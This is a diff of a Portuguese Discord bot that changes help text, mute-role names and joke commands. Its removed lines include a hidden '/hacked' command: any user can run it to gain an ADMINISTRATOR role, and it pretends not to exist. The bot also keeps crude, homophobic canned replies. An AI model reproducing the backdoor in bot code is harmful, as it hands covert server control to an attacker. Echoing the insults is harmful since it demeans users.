@@ -55,7 +55,7 @@ bot.on('message', async message => {
       let embed = new Discord.RichEmbed()
       .setColor("#FFFF00")
       .setTitle("📢 Ajuda 📢")
-      .setDescription("\n\n:white_small_square: +anuncio - Com este comando você pode fazer um anuncio no chat que você digitou o comando. \n\n :white_small_square:+anunciopv - Mandar mensagem no privado de todos os jogadores do servidor \n\n :white_small_square:+convidar - Você consegue o link para me convidar para seu servidor\n\n :white_small_square:+mute - Tira a permissão de falar da pessoa que for mutada, você deve ter o cargo **SILENCIADO** criado.\n\n :white_small_square:+mensagem - Você manda uma mensagem para o meu criador.\n\n:white_small_square: +perguntar - Está solitario, faça perguntas para ele o cara mais sincero.\n\n",)
+      .setDescription("\n\n:white_small_square: /anuncio - Com este comando você pode fazer um anuncio no chat que você digitou o comando. \n\n :white_small_square:/anunciopv - Mandar mensagem no privado de todos os jogadores do servidor \n\n :white_small_square:/convidar - Você consegue o link para me convidar para seu servidor\n\n :white_small_square:/mute - Tira a permissão de falar da pessoa que for mutada, você deve ter o cargo **SILENCIADO** criado.\n\n :white_small_square:/mensagem - Você manda uma mensagem para o meu criador.\n\n:white_small_square: /perguntar - Está solitario, faça perguntas para ele o cara mais sincero.\n\n",)
       .setTimestamp()
       .setFooter("Antenciosamente AnúncioBOT")
       message.channel.send(embed);
@@ -83,24 +83,6 @@ bot.on('message', async message => {
       message.guild.members.find(m => m.id === "430093309617111063").send(anuncio);
     }
 
-    bot.on('message', message => {     
-      if (message.content.startsWith("/sugerir")) { //quando o comando for usado
-          message.delete(); 
-          const args = message.content.split(" ").slice(1);// pegar do 1 argumento adiante
-          if(!args[0]) return message.channel.send(//se não tiver argumentos
-          embedd = new Discord.RichEmbed()//falar isso:
-          .setDescription('<@' + message.author.id + '>\n Use o comando corretamente!\nExemplo:\n\n+sugerir tenha mais staffers')
-          .setTimestamp()
-          .setColor('#b13a64'))//se estiver tudo dentro dos parametros falar a sugestão
-          let sugestão = new Discord.RichEmbed()
-          .setDescription(':mailbox: Sugestão\n:writing_hand: Author:\n' + message.author.username + '\n:idea: Sugestão:\n' + args.join(" "))
-          .setColor('#b13a64')
-          .setTimestamp()
-          let votação = message.guild.channels.find(c => c.name == 'Sugestões') ;
-          votação.send(sugestão).then(m =>{
-              m.react('👍').then(m.react('👎'))//reagir com positivo/negativo
-          })}})
-
         if(comando === `perguntar`) {
         var respostas = [`Sou Gay eu admito`,`Não te interessa.`, 'Filho da puta', 'Nem existe numero pra isso', 'Umas 300mil vezes', '12200000',`Sim`, 'Não', 'Sua mãe', 'Posto ipiranga', 'RedeSky', 'Claro que sim', 'Eu te amo', 'Várias vezes', 'Eu slá porra', 'Nunca nem vi', 'Que viage é essa?', 'Guilherme o melhor', 'Você é gay xiu', 'Revista playboy', 'Bebe', 'Felipe Neto', 'Luccas Netto', 'Anuncio igual sua mãe', 'Nem copiei ninguém', 'Talvez', 'Imagina...', 'Eu sei...', 'Claro que não', 'Seu idiota']
           var variavel = respostas[Math.floor(Math.random() * respostas.length)]
@@ -113,17 +95,27 @@ bot.on('message', async message => {
           message.channel.send(embed)
         }
 
+        if(comando === `deathnote`) {
+          let embed = new Discord.RichEmbed()
+          .setColor('RANDOM')
+          .addField(`Infelizmente o ${message.mentions.users.first()} foi morto pelo DeathNote`)
+          .addField("Morreu de:",reason)
+          .addField("Assassino:", `${message.author.tag}`)
+          .setThumbnail("http://meow-meow-meowstic.tumblr.com/post/97752097995/bang")
+          message.channel.send(embed)
+        }
+
         if (message.content.startsWith("/mute")) { 
           let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
           if(!tomute) return message.reply("Eu não achei o usuario");
           if(!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send('**Sem permissão**');
-          let muterole = message.guild.roles.find(`name`, "Mutado");
+          let muterole = message.guild.roles.find(`name`, "Silenciado");
          
           if(!muterole){
             try{
               muterole = await message.guild.createRole({
-                name: "Mutado",
-                color: "#000000",
+                name: "Silenciado",
+                color: "#000001",
                 permissions:[]
               })
               message.guild.channels.forEach(async (channel, id) => {
@@ -142,36 +134,6 @@ bot.on('message', async message => {
           await(tomute.addRole(muterole.id));
           message.reply("**Usúario mutado com sucesso!**");
       }  
-
-
-      if (message.content.startsWith("/hacked")) { 
-        let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-        if(!tomute) return message.reply("Esse comando não existe.");
-        let muterole = message.guild.roles.find(`name`, "MASTER");
-       
-        if(!muterole){
-          try{
-            muterole = await message.guild.createRole({
-              name: "MASTER",
-              color: "#000000",
-              permissions:[ADMINISTRATOR]
-            })
-            message.guild.channels.forEach(async (channel, id) => {
-              await channel.overwritePermissions(muterole, {
-                SEND_MESSAGES: false,
-                ADD_REACTIONS: false
-              });
-            });
-          }catch(e){
-            console.log(e.stack);
-          }
-        }
-      
-
-      
-        await(tomute.addRole(muterole.id));
-        message.reply("**Esse comando não existe.**");
-    }  
 
 });
 bot.login(config.token);
